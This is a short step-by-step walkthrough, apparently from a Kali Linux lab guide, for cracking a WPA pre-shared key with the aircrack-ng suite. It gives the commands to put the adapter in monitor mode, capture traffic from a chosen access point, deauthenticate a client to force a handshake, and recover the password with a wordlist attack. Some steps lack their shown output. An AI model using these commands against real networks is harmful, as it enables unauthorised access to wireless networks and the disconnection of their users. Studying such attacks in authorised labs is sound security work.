# 2. WPA PSK Exploit Walkthrough

1. Checking Wireless Network Card

2. Run **airmon-ng** to check and kill for the processes that could interfere with the operation

3. Put the network adapter in monitoring mode

 4. Now, check for available wireless networks.  
 command: airodump-ng wlan0mon  
 Output:

 5. run the below command to capture the traffic  
 root@kali:~\# airodump-ng -c 2 --bssid 50:D4:F7:3C:3A:76 -w capturedfile wlan0mon

 List of workstations and data transfer

6. Run this command to disconnect a client from the network and force it to reconnect  
root@kali:~\# aireplay-ng -0 -1 -a 50:D4:F7:3C:3A:76 -c 08:D8:33:F2:3B:50 wlan0mon

7. Now there should be a captured file .cap in the directory  
8. Run below command to extract the password from the file  
root@kali:~\# aircrack-ng -w mywordlist.txt -b 50:D4:F7:3C:3A:76 capturedfile-02.cap

